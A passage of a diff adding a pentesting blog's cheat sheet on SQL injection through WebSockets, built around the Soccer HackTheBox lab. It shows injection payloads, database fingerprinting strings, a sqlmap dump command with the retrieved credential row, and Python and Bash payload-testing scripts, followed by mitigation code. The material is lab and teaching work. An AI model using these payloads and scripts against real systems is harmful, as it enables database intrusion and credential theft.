+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#39;&#34;</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 3. Boolean-based testing
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;92130 or 5=1-- -&#34;</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 4. Confirm vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1 OR 1=1-- -&#34;</span><span class="p">}))</span>
+</span></span></code></pre></div><h3 id="sqlmap-exploitation">sqlmap Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Soccer HTB WebSocket SQLi</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --level <span class="m">5</span> --risk <span class="m">3</span> --batch --threads <span class="m">10</span> -D soccer_db --dump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Results found:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Database: soccer_db</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Table: accounts</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [1 entry]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># +------+-------------------+----------------------+----------+</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># | id   | email             | password             | username |</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># +------+-------------------+----------------------+----------+</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># | 1324 | player@player.htb | PlayerOftheMatch2022 | player   |</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># +------+-------------------+----------------------+----------+</span>
+</span></span></code></pre></div><hr>
+<h2 id="detection-and-response-analysis">Detection and Response Analysis</h2>
+<h3 id="response-analysis">Response Analysis</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Look for different response patterns</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Response time differences (time-based)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Content length variations (boolean-based)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Error messages (error-based)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Data extraction (union-based)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Response timing measurement</span>
+</span></span><span class="line"><span class="cl"><span class="nb">time</span> <span class="nb">echo</span> <span class="s1">&#39;{&#34;id&#34;:&#34;1 AND SLEEP(5)&#34;}&#39;</span> <span class="p">|</span> wscat -c ws://target:9091
+</span></span></code></pre></div><h3 id="database-fingerprinting">Database Fingerprinting</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// MySQL detection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND @@version LIKE &#39;%mysql%&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// SQL Server detection  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND @@version LIKE &#39;%Microsoft%&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// PostgreSQL detection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND version() LIKE &#39;%PostgreSQL%&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// SQLite detection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND sqlite_version() IS NOT NULL-- -&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="automation-scripts">Automation Scripts</h2>
+<h3 id="python-websocket-sqli-script">Python WebSocket SQLi Script</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_websocket_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payloads</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_message</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_error</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_close</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">close_status_code</span><span class="p">,</span> <span class="n">close_msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connection closed&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_open</span><span class="p">(</span><span class="n">ws</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connected to WebSocket&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Sending: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ws</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketApp</span><span class="p">(</span><span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">on_open</span><span class="o">=</span><span class="n">on_open</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">on_message</span><span class="o">=</span><span class="n">on_message</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">on_error</span><span class="o">=</span><span class="n">on_error</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">on_close</span><span class="o">=</span><span class="n">on_close</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ws</span><span class="o">.</span><span class="n">run_forever</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Usage</span>
+</span></span><span class="line"><span class="cl"><span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#39;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#39; AND SLEEP(5)-- -&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1 UNION SELECT @@version-- -&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">test_websocket_sqli</span><span class="p">(</span><span class="s2">&#34;ws://target:9091&#34;</span><span class="p">,</span> <span class="n">payloads</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="bash-testing-script">Bash Testing Script</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WebSocket SQLi Testing Script</span>
+</span></span><span class="line"><span class="cl"><span class="nv">URL</span><span class="o">=</span><span class="s2">&#34;ws://soc-player.soccer.htb:9091&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Testing WebSocket SQL Injection&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Target: </span><span class="nv">$URL</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Array of payloads to test</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payloads</span><span class="o">=(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#39; OR &#39;1&#39;=&#39;1-- -&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;92130 or 5=1-- -&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1 AND SLEEP(5)-- -&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1 UNION SELECT @@version-- -&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> payload in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">payloads</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Testing payload: </span><span class="nv">$payload</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;{\&#34;id\&#34;:\&#34;</span><span class="nv">$payload</span><span class="s2">\&#34;}&#34;</span> <span class="p">|</span> wscat -c <span class="nv">$URL</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;---&#34;</span>
+</span></span><span class="line"><span class="cl">    sleep <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><hr>
+<h2 id="mitigation-and-prevention">Mitigation and Prevention</h2>
+<h3 id="secure-websocket-implementation">Secure WebSocket Implementation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Input validation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">validateInput</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Whitelist allowed characters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^[a-zA-Z0-9_-]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Invalid input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Parameterized queries
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE id = ?&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="p">[</span><span class="nx">userId</span><span class="p">],</span> <span class="nx">callback</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Prepared statements
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM users WHERE id = ?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">stmt</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">userId</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="websocket-security-headers">WebSocket Security Headers</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Implement proper authentication
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connection&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="nx">request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Verify JWT token or session
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isAuthenticated</span><span class="p">(</span><span class="nx">request</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">socket</span><span class="p">.</span><span class="nx">close</span><span class="p">(</span><span class="mi">1008</span><span class="p">,</span> <span class="s1">&#39;Authentication required&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Rate limiting
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">rateLimiter</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">clientId</span> <span class="o">=</span> <span class="nx">getClientId</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isRateLimited</span><span class="p">(</span><span class="nx">clientId</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">close</span><span class="p">(</span><span class="mi">1008</span><span class="p">,</span> <span class="s1">&#39;Rate limit exceeded&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><hr>
+<h2 id="tools-and-resources">Tools and Resources</h2>
+<h3 id="websocket-testing-tools">WebSocket Testing Tools</h3>
+<ul>
+<li><strong>wscat</strong> - Command-line WebSocket client</li>
+<li><strong>Burp Suite</strong> - Professional WebSocket testing</li>
+<li><strong>OWASP ZAP</strong> - Free WebSocket proxy</li>
+<li><strong>websocat</strong> - Advanced WebSocket client</li>
+<li><strong>sqlmap</strong> - Automated SQL injection testing</li>
+</ul>
+<h3 id="browser-developer-tools">Browser Developer Tools</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Chrome/Firefox WebSocket inspection
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 1. Open Developer Tools (F12)
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 2. Go to Network tab
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 3. Filter by WS (WebSocket)
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 4. Interact with application
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 5. Analyze WebSocket frames
+</span></span></span></code></pre></div><hr>
+<p><em>WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.</em></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <nav class="paginav">
+      Tags:
+      <a class="tag" href="https://realspaceeagle.github.io/tags/websocket/"># Websocket</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/sql-injection/"># Sql-Injection</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/web-security/"># Web-Security</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/pentesting/"># Pentesting</a>
+    </nav>
+  </footer>
+</article>
+
+<style>
+.breadcrumbs {
+  font-size: 0.875rem;
+  color: var(--secondary);
+  margin-bottom: 1rem;
+}
+
+.breadcrumbs a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+.breadcrumbs a:hover {
+  text-decoration: underline;
+}
+
+.post-description {
+  font-size: 1.125rem;
+  color: var(--secondary);
+  margin: 1rem 0 2rem 0;
+  font-style: italic;
+}
+
+.post-tags a {
+  display: inline-block;
+  background: var(--code-bg);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.post-tags a:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+.tag {
+  display: inline-block;
+  background: var(--tertiary);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.tag:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+ 
+.cheatsheet-page pre {
+  position: relative;
+  font-size: 0.9rem;
+}
+
+.cheatsheet-page pre code {
+  display: block;
+  padding: 0;
+  margin-left: 0;
+}
+
+ 
+.cheatsheet-page pre::after {
+  content: "Copy";
+  position: absolute;
+  top: 0.5rem;
+  right: 0.5rem;
+  background: rgba(255, 255, 255, 0.1);
+  color: #fff;
+  padding: 0.25rem 0.5rem;
+  border-radius: 4px;
+  font-size: 0.75rem;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+.cheatsheet-page pre:hover::after {
+  opacity: 1;
+}
+
+ 
+.cheatsheet-page ul li a {
+  color: var(--primary);
+  text-decoration: none;
+  padding: 0.25rem 0;
+  display: block;
+  transition: color 0.2s ease;
+}
+
+.cheatsheet-page ul li a:hover {
+  color: var(--tertiary);
+  padding-left: 0.5rem;
+}
+</style>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+  const codeBlocks = document.querySelectorAll('.cheatsheet-page pre');
+  
+  codeBlocks.forEach(block => {
+    block.addEventListener('click', function(e) {
+      if (e.target === this || e.target.tagName === 'CODE') {
+        const code = this.querySelector('code');
+        if (code) {
+          navigator.clipboard.writeText(code.textContent).then(() => {
+            const button = this.querySelector('::after') || this;
+            const originalContent = button.textContent;
+            
+            
+            this.style.borderLeftColor = '#10b981';
+            setTimeout(() => {
+              this.style.borderLeftColor = '#2563eb';
+            }, 300);
+          });
+        }
+      }
+    });
+  });
+
+  
+  const headers = document.querySelectorAll('.cheatsheet-page h2, .cheatsheet-page h3');
+  headers.forEach(header => {
+    const id = header.textContent.toLowerCase()
+      .replace(/[^a-z0-9\s-]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '');
+    
+    header.id = id;
+    header.style.cursor = 'pointer';
+    
+    header.addEventListener('click', () => {
+      window.location.hash = '#' + id;
+      navigator.clipboard.writeText(window.location.href);
+    });
+  });
+});
+</script>
+
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
